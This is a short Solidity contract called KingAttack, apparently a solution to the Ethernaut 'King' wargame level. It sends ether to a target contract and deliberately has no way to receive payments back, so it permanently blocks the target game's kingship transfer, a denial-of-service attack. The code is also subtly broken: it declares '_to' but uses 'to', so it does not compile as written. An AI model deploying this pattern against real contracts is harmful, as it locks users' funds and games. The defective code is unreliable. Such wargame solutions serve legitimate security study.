pragma solidity ^0.6.0;

contract KingAttack{
    constructor(address payable _to)public payable{
        (bool success, ) = address(to).call{value: msg.value}("");
        require(success, "we are not the new king");
    }
}